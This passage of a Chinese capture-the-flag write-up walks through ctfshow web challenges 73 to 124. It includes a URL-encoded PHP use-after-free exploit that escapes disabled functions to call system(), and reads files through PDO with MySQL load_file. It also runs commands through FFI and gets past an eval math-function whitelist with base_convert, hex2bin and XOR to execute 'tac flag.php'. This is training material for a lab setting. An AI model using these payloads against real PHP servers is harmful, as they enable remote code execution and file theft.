20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20<span class="hljs-string">&#x27;WIN&#x27;</span>))%20%7B%0A%20%20%20%20%20%20%20%20die(<span class="hljs-string">&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;</span>)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>)%3B%0A%0A%20%20%20%20trigger_uaf(<span class="hljs-string">&#x27;x&#x27;</span>)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B<span class="hljs-string">&#x27;args&#x27;</span>%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn<span class="hljs-string">&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;</span>t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn<span class="hljs-string">&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;</span>t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E<br></code></pre></td></tr></table></figure><p>经过url编码之后的payload</p><h2 id="web73"><a class="markdownIt-Anchor" href="#web73"></a> web73</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=?&gt;&lt;?php     <span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&quot;glob:///*&quot;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;<span class="hljs-built_in">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-built_in">exit</span>(0);?&gt;<br></code></pre></td></tr></table></figure><p>先查一下在哪，得到flagc.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readgzfile(<span class="hljs-string">&quot;/flagc.txt&quot;</span>);ob_flush();<br>或者<br>c=include(<span class="hljs-string">&quot;/flagc.txt&quot;</span>);ob_flush();<br></code></pre></td></tr></table></figure><h2 id="web74"><a class="markdownIt-Anchor" href="#web74"></a> web74</h2><p>流程和上面的基本一致，flag在flagx.txt里面</p><h2 id="web75"><a class="markdownIt-Anchor" href="#web75"></a> web75</h2><p>可以继续用上面的原生类找到对应的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=?&gt;&lt;?php     <span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&quot;glob:///*&quot;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;<span class="hljs-built_in">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-built_in">exit</span>(0);?&gt;<br></code></pre></td></tr></table></figure><p>找到文件flag36.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">try &#123;<br><span class="hljs-comment"># 创建 PDO 实例, 连接 MySQL 数据库</span><br><span class="hljs-variable">$dbh</span> = new PDO(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br><br><span class="hljs-comment"># 在 MySQL 中，load_file(完整路径) 函数读取一个文件并将其内容作为字符串返回。</span><br>foreach(<span class="hljs-variable">$dbh</span>-&gt;query(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) as <span class="hljs-variable">$row</span>) &#123;<br><span class="hljs-built_in">echo</span>(<span class="hljs-variable">$row</span>[0]).<span class="hljs-string">&quot;|&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$dbh</span> = null;<br>&#125;<br><br>catch (PDOException <span class="hljs-variable">$e</span>) &#123;<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$e</span>-&gt;getMessage();<span class="hljs-built_in">exit</span>(0);<br>&#125;<br><br><span class="hljs-built_in">exit</span>(0);<br></code></pre></td></tr></table></figure><p>通过 PDO（PHP Data Objects）连接到 MySQL 数据库，并尝试读取服务器上的文件内容</p><p><code>load_file(&quot;/flag36.txt&quot;)</code> 是 MySQL 的函数，用于读取服务器上指定路径的文件内容。函数返回文件内容的字符串。</p><p><code>foreach</code> 循环遍历查询结果。因为 <code>load_file</code> 函数返回的是一个字符串，<code>$row[0]</code> 就是这个字符串。<code>echo($row[0]).&quot;|&quot;;</code> 将文件内容打印出来，并在内容后面加上 <code>|</code> 符号。</p><p>之后关闭数据库连接，捕捉异常信息。</p><p>上传payload的时候记得去掉注释</p><h2 id="web76"><a class="markdownIt-Anchor" href="#web76"></a> web76</h2><p>也是继续用原生类进行目录扫描得到flag在flag36d.txt里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=?&gt;&lt;?php     <span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&quot;glob:///*&quot;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;<span class="hljs-built_in">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-built_in">exit</span>(0);?&gt;<br></code></pre></td></tr></table></figure><p>然后还是用上面的sql执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=try &#123;<br><span class="hljs-variable">$dbh</span> = new PDO(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br><br>foreach(<span class="hljs-variable">$dbh</span>-&gt;query(<span class="hljs-string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) as <span class="hljs-variable">$row</span>) &#123;<br><span class="hljs-built_in">echo</span>(<span class="hljs-variable">$row</span>[0]).<span class="hljs-string">&quot;|&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$dbh</span> = null;<br>&#125;<br><br>catch (PDOException <span class="hljs-variable">$e</span>) &#123;<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$e</span>-&gt;getMessage();<span class="hljs-built_in">exit</span>(0);<br>&#125;<br><br><span class="hljs-built_in">exit</span>(0);<br></code></pre></td></tr></table></figure><h2 id="web77"><a class="markdownIt-Anchor" href="#web77"></a> web77</h2><p>还是可以继续使用原生类进行目录的扫描，可以得到flag在flag36x.txt里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=?&gt;&lt;?php     <span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&quot;glob:///*&quot;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;<span class="hljs-built_in">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-built_in">exit</span>(0);?&gt;<br></code></pre></td></tr></table></figure><p>但是之前的写法是不能继续用的报<code> could not find driver</code>的错误，此题利用的是PHP 7.4+的FFI特性，即外部函数接口特性，</p><p>先上payload跟着学习一下内容吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=<span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>讲一下简单的原理</p><p>这段 PHP 代码利用了 Foreign Function Interface (FFI) 扩展来调用 C 语言的 <code>system</code> 函数，从而执行系统命令。注意需要php版本在7.4及以上才有</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=<span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<br><span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><code>FFI::cdef</code>函数的作用是定义一个c函数的接口，<code>system</code> 是一个接受一个 <code>const char *</code> 类型参数的函数（也就是一个字符串），并返回一个整数。接下来是执行/readflag讲它的输出重定向到1.txt里面，然后最后一步代码进行执行</p><h2 id="web118"><a class="markdownIt-Anchor" href="#web118"></a> web118</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">看源码有个code传入，尝试一下有evil，fuzz看看内容发现<span class="hljs-code">`A-Z`</span>~,<span class="hljs-code">`@ # $ _ &#123;&#125; : ; ? . `</span>这些可以正常的输入，浅浅的学习一下吧<br><br><span class="hljs-code">`echo $PATH`</span> 是一个常见的 Linux 或 Unix 系统命令，用来显示当前用户的 <span class="hljs-code">`PATH`</span> 环境变量的值。<span class="hljs-code">`PATH`</span> 环境变量是一个包含目录路径的列表，操作系统会按照这些路径的顺序查找可执行文件。如下<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@iZ0jl9s6tb2yuz8o6oleiyZ:~# <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">输入echo $&#123;PATH:~0&#125;会回显n其实因为$PATH的最后一位是n $PWD的最后一位 也就是 /var/www/html的最后一位是l，那么可以执行<br>code=$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???<br></code></pre></td></tr></table></figure><p>就相当于执行了<code>nl flag.php</code>然后看源码就行了</p><h2 id="web119"><a class="markdownIt-Anchor" href="#web119"></a> web119</h2><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/119.png" alt="119"></p><h2 id="web120"><a class="markdownIt-Anchor" href="#web120"></a> web120</h2><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/120.png" alt="120"></p><h2 id="web121"><a class="markdownIt-Anchor" href="#web121"></a> web121</h2><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/121.png" alt="121"></p><h2 id="web122"><a class="markdownIt-Anchor" href="#web122"></a> web122</h2><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/122.png" alt="122"></p><h2 id="web124"><a class="markdownIt-Anchor" href="#web124"></a> web124</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: 收集自网络</span><br><span class="hljs-comment"># @Date:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-10-06 14:04:45</span><br><br>*/<br><br>error_reporting(0);<br>//听说你很喜欢数学，不知道你是否爱它胜过爱flag<br><span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    show_source(__FILE__);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    //例子 c=20-1<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$content</span>) &gt;= 80) &#123;<br>        die(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-string">&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span><br><span class="hljs-string">    foreach (<span class="hljs-variable">$blacklist</span> as <span class="hljs-variable">$blackitem</span>) &#123;</span><br><span class="hljs-string">        if (preg_match(&#x27;/&#x27; . <span class="hljs-variable">$blackitem</span> . &#x27;/m&#x27;, <span class="hljs-variable">$content</span>)) &#123;</span><br><span class="hljs-string">            die(&quot;</span>请不要输入奇奇怪怪的字符<span class="hljs-string">&quot;);</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br><span class="hljs-string">    <span class="hljs-variable">$whitelist</span> = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="hljs-string">    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  </span><br><span class="hljs-string">    foreach (<span class="hljs-variable">$used_funcs</span>[0] as <span class="hljs-variable">$func</span>) &#123;</span><br><span class="hljs-string">        if (!in_array(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;</span><br><span class="hljs-string">            die(&quot;</span>请不要输入奇奇怪怪的函数<span class="hljs-string">&quot;);</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    //帮你算出答案</span><br><span class="hljs-string">    eval(&#x27;echo &#x27;.<span class="hljs-variable">$content</span>.&#x27;;&#x27;);</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><p>这题认真学习一下，题目是ciscn-2019的love math 怪不得感觉眼熟</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=20-1<br>回显是19<br></code></pre></td></tr></table></figure><h3 id="0x01-17"><a class="markdownIt-Anchor" href="#0x01-17"></a> 0x01</h3><p>已知的是php可以进行嵌套比如说</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">$orange=&#x27;system&#x27;;$orange(&#x27;cat /flag&#x27;);<br>实际就是执行system(&#x27;cat /flag&#x27;);<br></code></pre></td></tr></table></figure><p>所以可以尝试进行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=(<span class="hljs-variable">$_GET</span>[a])(<span class="hljs-variable">$_GET</span>[b])&amp;a=system&amp;b=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><p>a和b不能用可以用函数代替</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=(<span class="hljs-variable">$_GET</span>[pi])(<span class="hljs-variable">$_GET</span>[abs])&amp;pi=system&amp;abs=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><p>有个老生常谈的函数hex2bin将十六进制进行转化为ASCII，_GET的十六进制是<code>5f474554</code>,但是也没有hex2bin，也不能填这些但是里面有个函数是<code>base_convert</code>，可以用这个函数构造hex2bin，36进制包含0-9和A-Z,转化为十进制就是<code>37907361743</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">base_convert(37907361743,10,36)  <span class="hljs-comment">#构造出hex2bin</span><br></code></pre></td></tr></table></figure><p>再利用函数<code>dechex</code>函数十进制转化为十六进制<code>1598506324</code>,构造的流程如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">base_convert(37907361743,10,36)(dechex(1598506324));<br>--&gt; hex2bin(dechex(1598506324));<br>--&gt; hex2bin(5f474554);<br>--&gt; _GET<br></code></pre></td></tr></table></figure><p>最后构造payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-variable">$pi</span>=base_convert(37907361743,10,36)(dechex(1598506324));($<span class="hljs-variable">$pi</span>)&#123;pi&#125;(($<span class="hljs-variable">$pi</span>)&#123;abs&#125;)&amp;pi=system&amp;abs=tac flag.php;<br></code></pre></td></tr></table></figure><p><code>($_GET)&#123;pi&#125;(($_GET)&#123;abs&#125;)</code>然后传入内容执行代码</p><h3 id="0x02-17"><a class="markdownIt-Anchor" href="#0x02-17"></a> 0x02</h3><p>原题也可以利用<code>getallheaders</code>,但是本题的环境有些变化</p><h3 id="0x03-4"><a class="markdownIt-Anchor" href="#0x03-4"></a> 0x03</h3><p>先上payload，看看大佬的思路</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-variable">$pi</span>=(is_nan^(6).(4)).(tan^(1).(5));<span class="hljs-variable">$pi</span>=$<span class="hljs-variable">$pi</span>;<span class="hljs-variable">$pi</span>&#123;0&#125;(<span class="hljs-variable">$pi</span>&#123;1&#125;)&amp;0=system&amp;1=<span class="hljs-built_in">tac</span> flag.php;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-variable">$payload</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>,  <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span> , <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span 